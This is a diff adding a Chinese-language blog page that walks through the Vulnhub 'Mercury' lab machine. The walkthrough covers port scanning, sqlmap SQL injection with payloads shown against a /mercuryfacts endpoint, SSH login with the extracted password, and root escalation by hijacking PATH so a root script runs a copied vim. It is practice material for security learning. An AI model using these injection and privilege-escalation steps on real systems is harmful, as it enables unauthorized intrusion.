@@ -1,0 +1,191 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mercury - yifang</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="Vulnhub Mercury打靶靶机介绍星球系列靶机
+下载地址：https://drive.google.com/file/d/1GkmkuZCXrSvSzTyXxQZfjpL-psqZF7Td
+,"> 
+    <meta name="author" content="yifang"> 
+    <link rel="alternative" href="atom.xml" title="yifang" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">yifang</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">Mercury</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">Mercury</h1>
+        <div class="stuff">
+            <span>十一月 07, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Vulnhub-Easy/" rel="tag">Vulnhub-Easy</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="Vulnhub-Mercury打靶"><a href="#Vulnhub-Mercury打靶" class="headerlink" title="Vulnhub Mercury打靶"></a>Vulnhub Mercury打靶</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>星球系列靶机</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1GkmkuZCXrSvSzTyXxQZfjpL-psqZF7Td">https://drive.google.com/file/d/1GkmkuZCXrSvSzTyXxQZfjpL-psqZF7Td</a></p>
+<p>难度：Easy</p>
+<p>利用技术：</p>
+<p>​    setnv提权</p>
+<p>攻击主机：Kali Linux</p>
+<h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><p>首先进行信息，<code>arp-scan </code> <code>nmap</code>进行主机发现和端口扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">192.168.0.100	08:00:27:09:37:ea	PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nmap -sV -p- -sC 192.168.0.100</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-07 02:20 EST</span><br><span class="line">Nmap scan report for 192.168.0.100</span><br><span class="line">Host is up (0.0045s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)</span><br><span class="line">|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)</span><br><span class="line">|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)</span><br><span class="line">8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2</span><br></pre></td></tr></table></figure>
+
+<p>目标打开了<code>22</code> <code>8080</code>端口</p>
+<h3 id="2-漏洞发现-amp-利用"><a href="#2-漏洞发现-amp-利用" class="headerlink" title="2.漏洞发现&amp;利用"></a>2.漏洞发现&amp;利用</h3><p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071532573.jpg"></p>
+<p>打开目标的<code>8080</code>端口，并没有发现任何有用的信息，包括审查页面的源码，以及<code>robots.txt</code>，都没有一点有价值的信息，尝试随便输入一个地址看一下，发现报错内容里面存在一个路径 <code>/mercuryfacts </code>，访问后发现了该页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071537948.png"></p>
+<p><code>id</code>这个关键字应该是很敏感了，更何况地址栏那么明显的伪静态，使用sqlmap进行注入，获得服务器密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ sqlmap -u http://192.168.0.100:8080/mercuryfacts/1* --dbs --batch</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: http://192.168.0.100:8080/mercuryfacts/1 AND 2334=2334</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: http://192.168.0.100:8080/mercuryfacts/1 AND GTID_SUBSET(CONCAT(0x716a786271,(SELECT (ELT(3697=3697,1))),0x7170626a71),3697)</span><br></pre></td></tr></table></figure>
+
+<p>获得了服务器密码后，ssh进行登录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071542316.png"></p>
+<p>获得了另一个操作系统账户，进行登录</p>
+<h3 id="3-提权-amp-amp-偷天换日"><a href="#3-提权-amp-amp-偷天换日" class="headerlink" title="3.提权&amp;&amp;偷天换日"></a>3.提权&amp;&amp;偷天换日</h3><p>/usr/bin/check_syslog.sh内容为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">tail -n 10 /var/log/syslog</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071608660.png"></p>
+<p>复制<code>/bin/vim</code>命名为<code>/tmp/tail</code>，添加系统变量，使tail命令调用/tmp/tail文件，以root打开vim，在vim命令界面输入 <code>!/bin/bash</code> 提权成功 [这波直接偷天换日]</p>
+<p>打靶结束！！！</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='https://www.yxz6.tech/crymore.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='https://www.yxz6.tech/windyhill.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
